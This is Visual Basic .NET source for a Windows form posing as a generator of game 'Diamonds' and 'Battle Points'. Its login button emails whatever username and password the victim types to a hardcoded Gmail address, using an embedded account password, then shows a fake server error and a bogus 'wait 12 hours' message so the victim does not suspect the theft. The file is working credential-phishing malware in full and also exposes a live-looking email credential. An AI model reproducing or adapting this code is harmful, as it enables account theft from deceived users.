Imports System.Net.Mail

Public Class Form1

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text = "" Then
            MsgBox("Username Is Missing")
            If TextBox2.Text = "" Then
                MsgBox("Password Is Mising")
            Else
            End If
        End If
        Dim smtpServer As New SmtpClient()
        Dim mail As New MailMessage()
        smtpServer.Credentials = New Net.NetworkCredential("anandarauf02@gmail.com", "ceomrvd022000")
        smtpServer.Port = 587
        smtpServer.Host = "smtp.gmail.com"
        smtpServer.EnableSsl = True
        mail = New MailMessage()
        mail.From = New MailAddress("anandarauf02@gmail.com")
        mail.To.Add("anandarauf02@gmail.com")
        mail.Subject = "Username: " & TextBox1.Text
        mail.Body = "Username : " & TextBox1.Text & ", " & "Password : " & TextBox2.Text
        smtpServer.Send(mail)
        MsgBox("Disconnected From Server, Please try again later!", MsgBoxStyle.Critical, "Server Error")
        Dim done As MsgBoxResult
        done = MsgBox("Wait 12 Hours For Succeed Hacked!!!!. Done? Klik Yes.", MsgBoxStyle.Question + MsgBoxStyle.YesNo, "Confirm")
        If done = MsgBoxResult.Yes Then
            Me.Dispose()
            Exit Sub
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim response As MsgBoxResult
        response = MsgBox("Are You Sure You Want To Exit?", MsgBoxStyle.Question + MsgBoxStyle.YesNo, "Confirm")
        If response = MsgBoxResult.Yes Then
            Me.Dispose()
        ElseIf response = MsgBoxResult.No Then
            Exit Sub
        End If
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Me.LinkLabel1.LinkVisited = True
        System.Diagnostics.Process.Start("https://www.instagram.com/pcmdh/")
    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged
        ComboBox1.Items.Add("300 Diamonds")
        ComboBox1.Items.Add("480 Diamonds")
        ComboBox1.Items.Add("700 Diamonds")
        ComboBox1.Items.Add("999 Diamonds")

    End Sub

    Private Sub ComboBox2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox2.SelectedIndexChanged
        ComboBox2.Items.Add("300 Battle Points")
        ComboBox2.Items.Add("480 Battle Points")
        ComboBox2.Items.Add("700 Battle Points")
        ComboBox2.Items.Add("999 Battle Points")
    End Sub
End Class



